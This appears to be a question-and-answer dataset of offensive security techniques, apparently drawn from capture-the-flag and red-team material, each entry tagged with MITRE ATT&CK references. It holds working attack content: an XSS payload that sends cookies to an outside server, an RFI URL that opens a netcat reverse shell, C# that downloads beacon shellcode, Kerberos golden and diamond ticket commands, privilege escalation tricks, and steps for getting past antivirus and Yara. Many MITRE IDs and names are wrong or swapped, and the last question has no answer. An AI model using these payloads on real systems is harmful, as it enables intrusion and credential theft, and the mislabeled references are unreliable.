## Q: How can you use the shadow.bak file to gain access to other user accounts on a Linux system?
A: The shadow.bak file often contains hashed passwords for user accounts on a Linux system. You can copy this file to your local machine and attempt to crack the hashes using tools like John the Ripper. Once you have cracked the hashes, you can use the credentials to log in as other users on the system and perform lateral movement. MITRE References: MITRE ID is T1552, MITRE Name is: Unsanitized Input Injection, and MITRE Tactics are: Credential Access.

## Q: What are some common techniques for Linux privilege escalation?
A: Common Linux privilege escalation techniques include: 1) Exploiting unprotected credentials or insecure file permissions to gain elevated access, 2) Leveraging misconfigured binaries or software with SUID/GUID flags, and 3) Identifying and exploiting kernel vulnerabilities. Techniques like manual enumeration, automated tools, and exploit research can reveal these weaknesses. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: Explain the basic steps to exploit a buffer overflow vulnerability in a SUID binary on a Linux system.
A: To exploit a buffer overflow vulnerability in a SUID binary on Linux:

1. Use a tool like 'pattern_create.rb' from the Metasploit framework to generate a unique pattern and run the SUID binary with a large argument to find the EIP offset.
2. Determine the buffer start address and calculate the return address to overwrite EIP.
3. Craft a payload consisting of a NOP sled, your shellcode, and the return address (in little-endian format).
4. Execute the SUID binary with the malicious payload to gain a root shell. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: Describe the process of using SQL injection to bypass authentication on a web application.
A: To bypass authentication using SQL injection:

1. Identify input fields on the login page that are vulnerable to injection.
2. Craft a malicious SQL query, such as "' OR '1'='1", and inject it into the password field.
3. The malicious query will evaluate to true, allowing you to bypass authentication and gain access to the application. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you leverage configuration files and credential reuse to gain access to a target system?
A: To leverage configuration files and credential reuse to gain access to a target system:1. Carefully review any configuration files, such as database connection details or server settings, that are discovered during enumeration. These may contain valid credentials that can be reused elsewhere.2. If web application login pages are found, try using the credentials from the configuration files to authenticate. This is a common technique called 'credential reuse'.3. Once authenticated, explore the web application further, looking for any sensitive information or functionality that could lead to privilege escalation, such as access to administrative interfaces or the ability to execute commands.4. If the configuration files contain information about other services or applications running on the system, such as Ajenti or other management tools, attempt to access those as well using the discovered credentials.5. Continually expand your access and privileges on the system by leveraging any credentials or information obtained through the reuse of discovered configuration files. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Initial Access, Persistence, Privilege Escalation.

## Q: How can you leverage Ajenti, a server management application, to gain root access on a target system?
A: To leverage Ajenti, a server management application, to gain root access on a target system:1. Identify the presence of Ajenti running on the target system, typically on port 8000.2. Discover valid credentials for Ajenti, such as by reusing credentials found in configuration files or by brute-forcing the login page.3. Log into the Ajenti web interface using the discovered credentials.4. Navigate to the 'Terminal' section within Ajenti, which provides a root-level shell on the target system.5. Use the root shell to execute further commands and gain full control of the system.Note that Ajenti is a powerful server management tool and gaining root access through it can lead to complete compromise of the target system. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access, Privilege Escalation.

## Q: What technique can be used to bypass network firewalls and access resources on an internal network?
A: Port forwarding and SSH tunneling can be used to bypass network firewalls and access resources on an internal network. These techniques involve creating a secure connection through an intermediary server to reach restricted hosts or services. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: What techniques can be used to escalate privileges on a Linux system?
A: One technique is path hijacking, where a malicious program is placed in a directory that is searched before the legitimate program. For example, the /usr/local/bin directory was writable by the jkr user due to their membership in the staff group, allowing a malicious uname binary to be placed there and executed by root. MITRE References: MITRE ID is T1546, MITRE Name is: event triggered execution, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use IPFS to search for and read encrypted files on a target system?
A: To use IPFS to search for and read encrypted files on a target system, you can follow these steps:1. Enumerate the IPFS files on the target system using the 'ipfs refs local' command to list the local references.2. Use the 'ipfs ls' command to view the file names associated with the hashes.3. Identify any potentially interesting files, such as encrypted SSH keys or email files.4. Use the 'ipfs cat' command along with the file hash to read the contents of the encrypted files.5. Attempt to decrypt the files, such as by cracking an encrypted SSH key using a tool like John the Ripper.This allows you to search for and access sensitive data stored on the target system using the IPFS protocol, even if the HTTP gateway is not configured. MITRE References: MITRE ID is T1213, MITRE Name is: Data from Information Repositories, and MITRE Tactics are: Collection.

## Q: How can you exploit a SUID binary that interacts with a local Ethereum contract to gain root privileges?
A: To exploit a SUID binary that interacts with a local Ethereum contract to gain root privileges, you can follow these steps:1. Use the web3.py library to interact with the local Ethereum node and contract:   - Connect to the node using the HTTPProvider and the localhost port the binary is running on.   - Load the contract ABI and address from the provided JSON file.   - Use the contract functions to set the username, password, and approval status to values you control.   - Transfer the full token supply to your controlled account.2. Run the SUID binary with the crafted credentials to gain access.3. Once you have access, you can use the bmap command with the --mode slack option to extract any hidden data, such as the root flag, from the slack space of the memory blocks.This allows you to leverage the vulnerable SUID binary and Ethereum contract interaction to escalate your privileges to root on the system. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can SQL injection be used to write files to a web server's file system?
A: SQL injection can be used to write files to a web server's file system by leveraging the "INTO OUTFILE" keyword in SQL. For example, the query "http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'" will write the contents of /etc/passwd to a file named hacked.txt in the web server's document root. This technique can also be used to write web shells or other malicious files to the server. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can the SUID bit on the systemctl binary be leveraged to gain root privileges?
A: The SUID bit on the systemctl binary can be leveraged to gain root privileges by creating a custom systemd service that runs a command as root. This can be done by creating a service file in a location that is writable by the current user, such as /tmp/pwn.service, with the contents "[Service]
Type=oneshot
ExecStart=/bin/bash -c 'id > /tmp/output'". Then, the service can be linked into the systemd search path using "systemctl link /tmp/pwn.service" and started with "systemctl start pwn". This will execute the "id" command as root, and the output can be seen in the /tmp/output file. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you leverage a misconfigured Logstash filter to escalate privileges on a system?
A: In the case of the Haystack machine, the Logstash configuration has a misconfigured filter that allows for command execution. The key steps are:

1. Examine the Logstash configuration files in /etc/logstash/conf.d:
   - The input.conf file specifies that Logstash will monitor /opt/kibana/logstash_* files
   - The filter.conf file uses a grok filter to match 'Ejecutar Comando: ' and capture the command into a variable
   - The output.conf file is empty, but would normally execute the captured command

2. Create a file in /opt/kibana named logstash_execute with the content:
   `Echo 'Ejecutar Comando: Whoami > /tmp/user'  > /opt/kibana/logstash_execute`

3. Wait for Logstash to execute the command (within 10 seconds) and check the /tmp/user file, which will contain the output of 'whoami' - showing that it is running as the root user.

This allows you to escalate privileges from the 'kibana' user to root by leveraging the misconfigured Logstash filters. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you create a valid JWT cookie to bypass authentication on a web application?
A: To create a valid JWT cookie, you'll need to know the secret key used to sign the token. Once you have the secret key, you can use an online JWT editor tool to generate a new cookie:

1. Set the payload data with the required access_code or other attributes.
2. Copy the secret key and select "base64 encoded secret".
3. The tool will generate a valid JWT cookie that can be used to bypass authentication.

This technique can be used to gain access to restricted areas of a web application. Make sure to replace any invalid cookies in your browser with the newly created one. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: Explain how you can exploit an LFI vulnerability using FFMPEG to read arbitrary files on a web server
A: FFMPEG, a popular multimedia framework, has an LFI vulnerability that can be exploited to read arbitrary files on a web server. To do this:

1. Create a malicious AVI file that includes a path traversal payload in the file name.
2. Upload the malicious AVI to the vulnerable web application.
3. The application will attempt to convert the file using FFMPEG, triggering the LFI vulnerability and allowing you to read the contents of the specified file.

This technique can be used to read sensitive files, such as configuration files or password hashes, from the web server. Make sure to replace the file paths with the ones you want to target. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can you use Python's eval() function to execute arbitrary code and gain a foothold on a system?
A: The eval() function in Python can be used to execute arbitrary code that is passed as a string. This can be exploited if the eval() function is used to process user input without proper sanitization. An attacker can inject malicious Python code into the input, which will then be executed by the eval() function. This can be used to gain a foothold on the system, for example by executing a reverse shell command. However, this practice is highly insecure and should be avoided in production code. MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: Execution.

## Q: How can a malicious ODS document be created to bypass Yara detection?
A: To create a malicious ODS document that bypasses Yara detection, the following steps can be used:1. Split the malicious PowerShell command into multiple strings and concatenate them during execution. This can be done by encoding the command in base64 and splitting it across multiple variables.2. Create a LibreOffice/OpenOffice macro that executes the concatenated PowerShell command when the document is opened.3. Assign the macro to the "Open Document" event to ensure it runs automatically.4. Save the document and upload it to the target's malware dropbox. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: How can a malicious Ghidra project be used to exploit XXE and steal admin hashes?
A: To exploit XXE in Ghidra and steal admin hashes:1. Download and extract the Ghidra software suite.2. Create a new Ghidra project and modify the project.prp file to include an XXE payload that references a listener on your machine.3. Archive the entire Ghidra project directory and upload it to the target's "proj_drop" folder.4. When an admin opens the malicious Ghidra project, your XXE payload will be executed, and the NetNTLMv2 hash of the user will be captured by the listener.5. The captured hash can then be cracked using tools like John the Ripper or Hashcat to obtain the admin's password. MITRE References: MITRE ID is T1111, MITRE Name is: Two-Factor Authentication Interception, and MITRE Tactics are: Credential Access.

## Q: How can we use the KeePass password manager to crack a password-protected database?
A: To crack a password-protected KeePass database:1. Obtain the KeePass database file and any potential keyfiles.2. Use `keepass2john` to generate password hashes from the database and keyfiles.   - `keepass2john -k <keyfile> <database.kdbx> >> hashes.txt`3. Use John the Ripper with a wordlist like `rockyou.txt` to crack the hashes.   - `john --wordlist=rockyou.txt hashes.txt`4. If the password is cracked, use `kpcli` (KeePass Command-Line Interface) to open the database and extract the passwords.   - `kpcli --kdb <database.kdbx> --key <keyfile>`   - `kpcli> show 'MyPasswords'` MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: Credential Access.

## Q: What does the Cobalt Strike artifact kit do, and how can it be used to bypass antivirus detection?
A: The artifact kit produces "placeholder" binaries that contain all the logic for executing a Beacon, but without the actual Beacon payload inside. When a payload is generated from the Cobalt Strike UI, it takes one of these artifact files and patches it on-the-fly with Beacon shellcode. When executed, the artifact will load and run that shellcode. Changing existing, or creating new templates, allows you to change how that shellcode is actually executed, and subsequently bypass AV signatures and/or behavioural analysis. By modifying the strings used in the "bypass-pipe.c" file, such as changing "MSSE" to "Rasta", the artifact can be customized to avoid detection. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you use LOLBAS to bypass the 'Block Office apps from creating child processes' ASR rule?
A: It turns out that not all processes are blocked when this ASR rule is enabled. For instance, WScript.Shell can be used to start Notepad. This suggests the ASR rule is based on a blacklist, so there may be scope to use command-line based execution. The LOLBAS project is a good place to look for potential bypasses. For example, it was discovered that msbuild.exe is not blocked by the ASR rule. MSBuild can execute inline C# code from a .xml or .csproj file, allowing you to potentially bypass the ASR rule. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: Defense Evasion, Execution.

## Q: How do you download shellcode from a Team Server using the HttpClient class in C#?
A: To download shellcode from a Team Server using the HttpClient class in C#, you can use the following code:

```csharpstatic async Task Main(string[] args)
{
    byte[] shellcode;

    using (var handler = new HttpClientHandler())
    {
        // ignore ssl, because self-signed
        handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

        using (var client = new HttpClient(handler))
        {
            // Download the shellcode
            shellcode = await client.GetByteArrayAsync("https://10.10.0.69/beacon.bin");
        }
    }
}```

This code uses the HttpClient class to download the shellcode from the Team Server, and the ServerCertificateCustomValidationCallback is used to ignore the self-signed SSL error. MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: Command and Control.

## Q: What are some of the privilege escalation techniques implemented in the Elevate Kit?
A: The Elevate Kit implements the following privilege escalation techniques:- `cve-2020-0796`: SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)- `ms14-058`: TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) - `ms15-051`: Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)- `ms16-016`: mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)- `svc-exe`: Get SYSTEM via an executable run as a service- `uac-schtasks`: Bypass UAC with schtasks.exe (via SilentCleanup)- `uac-token-duplication`: Bypass UAC with Token Duplication MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Privilege Escalation.

## Q: How can EyeWitness be used with a proxy to bypass network restrictions and capture screenshots of internal web applications?
A: EyeWitness can be used with a proxy to bypass network restrictions and capture screenshots of internal web applications. The example command shows using the proxychains tool to route EyeWitness traffic through a proxy at 127.0.0.1:1080 to access the target at 10.10.17.25. This allows EyeWitness to bypass network controls and successfully capture a screenshot of the internal web application. The version of EyeWitness used in the example is the latest available at the time of writing. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: What LOLBAS can be used to bypass the WDAC policy on WKSTN-3?
A: One LOLBAS (Living Off the Land Binaries and Scripts) that can be used to bypass a WDAC policy is MSBuild.exe, part of the .NET Framework v4.0.30319. MSBuild.exe can be used to execute arbitrary code and bypass WDAC policies that trust signed Windows applications. To use MSBuild.exe for this purpose, you would execute the following command on WKSTN-3: 

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe /? 

This will show that the application is blocked by the WDAC policy. To bypass this, you would need to find a specific method to execute code through MSBuild.exe that is not on the WDAC blocklist. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution: MSBuild, and MITRE Tactics are: Defense Evasion, Execution.

## Q: How can a Golden Ticket be created to gain Domain Admin privileges in the parent domain?
A: To create a Golden Ticket, the process is the same as creating Golden Tickets previously, the only additional information required is the SID of a target group (e.g. Domain Admins) in the parent domain. The key steps are:1. Get the SID of the 'Domain Admins' group in the parent domain (cyberbotic.io): `powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid`2. Get the name of a domain controller in the parent domain:`powershell Get-DomainController -Domain cyberbotic.io | select Name`3. Create the golden ticket using mimikatz:`mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi`The key parameters are /user, /domain, /sid, /sids, and /aes256. The final ticket is saved to the file 'cyberbotic.kirbi'. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: How can a Diamond Ticket be used to gain Domain Admin privileges in the parent domain?
A: The Rubeus 'diamond' command also has a '/sids' parameter, with which we can supply the extra SIDs we want in our ticket. The key steps are:1. Execute the Rubeus diamond command with the required parameters:`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap`2. Use the generated 'diamond.kirbi' ticket to access resources in the parent domain:`make_token CYBER\Administrator FakePass``kerberos_ticket_use C:\Users\Administrator\Desktop\diamond.kirbi``ls \\dc-1\c$`The key parameters are /ticketuser, /ticketuserid, /groups, /sids, and /krbkey. This allows us to add the SID of a privileged group in the parent domain to our ticket, granting us access to resources in the parent. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: How can an attacker reset a user's password and impersonate them using Cobalt Strike's Beacon?
A: To reset a user's password and impersonate them using Cobalt Strike's Beacon, the attacker can follow these steps:
1. Use the 'getuid' command to get the current user context.
2. Use the 'make_token' command to impersonate the target user (e.g. 'DEV\jking').
3. Use the 'run net user jadams N3wPassw0rd! /domain' command to reset the target user's password. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What is the purpose of the `spawnto` command in Cobalt Strike and how can it be used to evade detection?
A: The `spawnto` command in Cobalt Strike controls which binary is used as a temporary process for various post-exploitation workflows. By default, Cobalt Strike uses `rundll32.exe`, which is highly monitored and can trigger behavioral detections like Microsoft Defender. To evade detection, the `spawnto` command can be used to specify a different binary, such as `notepad.exe`, which would be less suspicious. The command can be set for both x86 and x64 architectures, and environment variables can be used to reference the appropriate system directory (`%windir%\sysnative\` or `%windir%\syswow64\`). MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: What are some common password patterns that can be used in a password spraying attack?
A: Patterns such as MonthYear (August2019), SeasonYear (Summer2019) and DayDate (Tuesday6) are very common. Password spraying is an effective technique for discovering weak passwords that users are notorious for using. Attackers should be cautious of localizations, e.g. Autumn vs Fall. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: What are two excellent tools for password spraying against Office 365 and Exchange?
A: Two excellent tools for password spraying against Office 365 and Exchange are MailSniper (version 2.0) and SprayingToolkit (version 2.7). MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: What technique can be used to crack the hashed password obtained from the Squid proxy configuration file?
A: The hashed password can be cracked using a password cracking tool like Hydra or Hashcat. The command 'hashcat -m 1600 hash.txt ./rockyou.txt' can be used to crack the hash using the rockyou.txt wordlist. This technique leverages a pre-computed rainbow table (mode 1600) to efficiently crack the password hash. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can an attacker leverage tar wildcards to escalate privileges to root?
A: By inspecting the contents of the backup files, it's revealed that the 'development' folder is being compressed using tar every 5 minutes. Using the exploit at 'https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt', the attacker can add arguments to the tar command that will execute a malicious script as root during the backup process. This is done by creating a 'writeup.sh' script in the 'development' folder and running the commands 'touch -- --checkpoint=1' and 'touch -- '--checkpoint-action=exec=sh writeup.sh''. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Privilege Escalation.

## Q: How can Metasploit be used to perform password attacks against SSH?
A: Metasploit can be used to perform password attacks against SSH using the 'auxiliary/scanner/ssh/ssh_login' module. This module can be activated using the 'use' command, and its options can be configured to specify the target host, port, username, and password file. Once the required options are set, the module can be executed with the 'run' command to attempt to brute-force the SSH credentials. Metasploit will display the valid credentials if the attack is successful and automatically establish a session with the target system. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can using a staged payload help bypass antivirus detection when exploiting a vulnerability?
A: Using a staged payload can help bypass antivirus detection by splitting the malicious code into two parts. The initial stage is a smaller payload that causes the victim to connect back to the attacker, which then transfers and executes the larger, more malicious secondary payload directly in the victim's memory. This can prevent the antivirus software from detecting the full shellcode, as it is no longer present in the initial exploit. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can the 'getsystem' command in Meterpreter be used to escalate privileges?
A: The 'getsystem' command in Meterpreter attempts to automatically elevate the user's privileges to the 'NT AUTHORITY\SYSTEM' level. It uses various techniques, such as named pipe impersonation and token duplication, to leverage the 'SeImpersonatePrivilege' and 'SeDebugPrivilege' permissions. This allows the attacker to execute commands and perform actions with the highest level of system privileges. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can RID bruteforcing be used to enumerate users on a Windows system?
A: RID (Relative Identifier) bruteforcing can be used to enumerate user accounts on a Windows system. The RID is a unique identifier that is part of a user's Security Identifier (SID). By querying the SIDs and enumerating the RIDs, it is possible to discover valid user accounts. CrackMapExec (version 5.2.0) can be used to perform RID bruteforcing with the `--rid-brute` option. This will attempt to enumerate user accounts by querying the SIDs and RIDs on the target system. MITRE References: MITRE ID is T1087, MITRE Name is: Account Discovery, and MITRE Tactics are: Discovery.

## Q: How can you bypass a file upload filter that checks the MIME type of the uploaded file?
A: To bypass a file upload filter that checks the MIME type, you can insert the magic bytes for a valid file type (like PNG) at the beginning of your malicious payload. This will make the file appear to be a valid image file, allowing it to bypass the filter. For example, the magic bytes for a PNG file are "89 50 4E 47 0D 0A 1A 0A". You can then add your PHP shell code after the magic bytes to achieve code execution. MITRE References: MITRE ID is T1189, MITRE Name is: Downloader, and MITRE Tactics are: Execution.

## Q: How can you leverage a crontab vulnerability to achieve command execution?
A: If a crontab script is running as a privileged user and does not properly sanitize its input, you can inject malicious commands by creating a file with a crafted filename. For example, if the crontab script uses the "rm" command on files in a certain directory, you can create a file named "; cmd" which will result in the command "rm -f $path; cmd" being executed, allowing you to run arbitrary commands. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Persistence, Privilege Escalation, Execution.

## Q: How can you exploit a network configuration script to gain root privileges?
A: Network configuration scripts on CentOS are vulnerable to command injection through the attribute values. This is because the scripts are sourced by the underlying service, leading to execution of anything after a space. You can exploit this by providing malicious input that will execute a command like "/bin/bash" to gain root privileges. MITRE References: MITRE ID is T1068, MITRE Name is: Elevation of Privilege, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit a vulnerable rsyslog template to gain code execution on a Linux system?
A: Rsyslog provides templates to save system logs into a database. If the template is not properly sanitized, it can be vulnerable to SQL injection. By crafting a malicious log message that injects SQL commands, you can leverage the COPY FROM PROGRAM feature in PostgreSQL to execute arbitrary system commands and gain code execution as the postgres user. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can you leverage a predictable password scheme to gain root access on a Linux system?
A: If the system uses a predictable password scheme, such as "<secret>@<username>", you can use this information to brute-force the root password. By discovering the password for a regular user account, you can apply the same password scheme to guess the root password and gain elevated privileges. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Initial Access.

## Q: How can you use git hooks to achieve remote code execution on a GitLab server?
A: Git hooks are scripts that are executed by Git before or after certain events, such as a commit or a push. To achieve remote code execution on a GitLab server, an attacker can create a malicious git hook in a repository that they have write access to. When a user with sufficient privileges (e.g., a developer) performs a git pull or merge in the repository, the malicious git hook will be executed, allowing the attacker to run arbitrary commands on the GitLab server. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement, Execution.

## Q: How can you use dynamic binary analysis to extract sensitive information from a Windows binary?
A: Dynamic binary analysis involves running a program in a controlled environment and observing its behavior. To extract sensitive information from a Windows binary, you can use a debugger like x32dbg to step through the execution of the binary and inspect the memory and registers. By setting breakpoints at key points in the execution, you can identify where sensitive information like passwords or other credentials are being used, and then inspect the memory to extract them. MITRE References: MITRE ID is T1482, MITRE Name is: Domain Trust Discovery, and MITRE Tactics are: Discovery.

## Q: How can you bypass a Web Application Firewall (WAF) when exploiting a vulnerability?
A: To bypass a WAF when exploiting a vulnerability, you can try techniques like URL encoding, using alternative encodings (e.g. Base64), or replacing spaces with alternative representations (e.g. %20, ${IFS}). The goal is to modify the payload in a way that bypasses the WAF's detection mechanisms without changing the underlying functionality of the exploit. This may require some trial and error to find the right encoding or representation that the WAF fails to detect. MITRE References: MITRE ID is T1102, MITRE Name is: Web Service, and MITRE Tactics are: Command and Control, Exfiltration.

## Q: How can you exploit a web application that is vulnerable to Cross-Site Scripting (XSS)?
A: To exploit a web application vulnerable to XSS, you can use JavaScript to steal the administrator's cookies and gain access to the application. First, craft an XSS payload that includes an image tag with an onerror attribute to send the cookies to your server. For example: <img src=x onerror=this.src='http://your-server.com/?cookies='+btoa(document.cookie)> . This will encode the cookies in base64 and send them to your server when the image fails to load. You can then use the stolen cookies to authenticate as the administrator and further compromise the system. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you exploit a web application that is vulnerable to SQL Injection?
A: To exploit a web application vulnerable to SQL Injection, you can use techniques like UNION-based injection and blind injection to extract data from the database. First, identify the number of columns in the table using the ORDER BY clause. Then, use a UNION SELECT statement to retrieve information like the current user, database name, and table names. Finally, you can leverage the LOAD_FILE() function to read files from the server's file system. For example: 'UNION SELECT 1,LOAD_FILE('C:/Windows/win.ini'),3-- - MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Exfiltration.

## Q: How can you exploit a Windows service that is vulnerable to a buffer overflow?
A: To exploit a Windows service vulnerable to a buffer overflow, you can use a technique like pattern generation and offset identification. First, generate a unique pattern using a tool like msf-pattern_create. Submit this pattern to the vulnerable service and identify the offset at which the buffer is overwritten using msf-pattern_offset. Then, craft a payload that includes your desired command (e.g., a reverse shell) and pad it with the appropriate number of bytes to overwrite the buffer. Finally, send the crafted payload to the vulnerable service to achieve code execution as the SYSTEM user. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation.

## Q: How can we abuse misconfigured permissions on an AD object to add our user to a privileged group?
A: If we discover that our user account has the GenericAll permission on an AD object, we can use that to add our user to a privileged group like the Management Department group. We can accomplish this using the net.exe command to add our user to the group, and then verify the change using Get-NetGroup from PowerView. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: How can you use the GPP (Group Policy Preferences) password vulnerability to decrypt stored passwords?
A: The GPP password vulnerability allows you to decrypt passwords that were stored in GPP-protected files, as the private encryption key has been publicly disclosed. You can use the gpp-decrypt tool in Kali Linux to decrypt these passwords and potentially gain access to sensitive accounts within the target environment. MITRE References: MITRE ID is T1212, MITRE Name is: Exploitation for Credential Access, and MITRE Tactics are: CredentialAccess.

## Q: What are the steps to exploit a .NET deserialization vulnerability using ysoserial.net?
A: To exploit a .NET deserialization vulnerability using ysoserial.net:1. Download the ysoserial.net binary from the GitHub releases page (https://github.com/pwntester/ysoserial.net/releases).2. Run ysoserial.net with the following arguments:   - `-p Json.Net`: Specifies the payload format as Json.Net   - `-g ObjectDataProvider`: Specifies the gadget type to use   - `-c <command>`: Specifies the command to execute on the target system   - `-f base64`: Outputs the payload in base64 format3. Copy the generated base64 payload and place it in the Bearer token of an HTTP request to the vulnerable endpoint.4. Send the request and observe the execution of the payload on the target system. MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: Execution.

## Q: How can you use dnSpy to reverse engineer a .NET executable and decrypt encrypted credentials?
A: To reverse engineer a .NET executable and decrypt encrypted credentials using dnSpy:1. Download and install dnSpy (https://github.com/dnSpy/dnSpy/releases).2. Open the .NET executable in dnSpy.3. Analyze the code, particularly the configuration file and any classes responsible for encryption/decryption.4. Identify the encryption algorithm, key, and other relevant parameters used for encrypting the credentials.5. Write a script or program to manually decrypt the encrypted credentials using the identified parameters. MITRE References: MITRE ID is T1006, MITRE Name is: File System Permissions Modification, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can Remote File Inclusion (RFI) be used to gain a reverse shell?
A: Remote File Inclusion (RFI) is a vulnerability that allows an attacker to include remote files on the server. This can be used to execute malicious code by hosting a web shell on a server controlled by the attacker, and then including it in the vulnerable application. First, set up an SMB share on your local machine and place a web shell (e.g., '<?=`$_GET[0]`?>') in the shared directory. Then, access the vulnerable application with the URL 'http://target.com/page.php?file=//attacker_ip/share/shell.php&0=nc.exe -e cmd.exe attacker_ip 4444' to execute the 'nc.exe' reverse shell. This will connect back to the attacker's Netcat listener. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can you use PowerView and Add-ObjectACL to gain DCSync privileges on a domain?
A: After gaining access as a user in the Account Operators group, you can use PowerView to add a new user to the Exchange Windows Permissions group, which has WriteDACL privileges on the domain. Then, you can use the Add-ObjectACL cmdlet to grant the new user DCSync privileges, allowing you to dump the NTLM hashes for all domain users. MITRE References: MITRE ID is TA0006, MITRE Name is: Credential Access, and MITRE Tactics are: T1003, T1134, T1484.

## Q: How can we exploit the Bolt CMS to gain access to the www-data user?
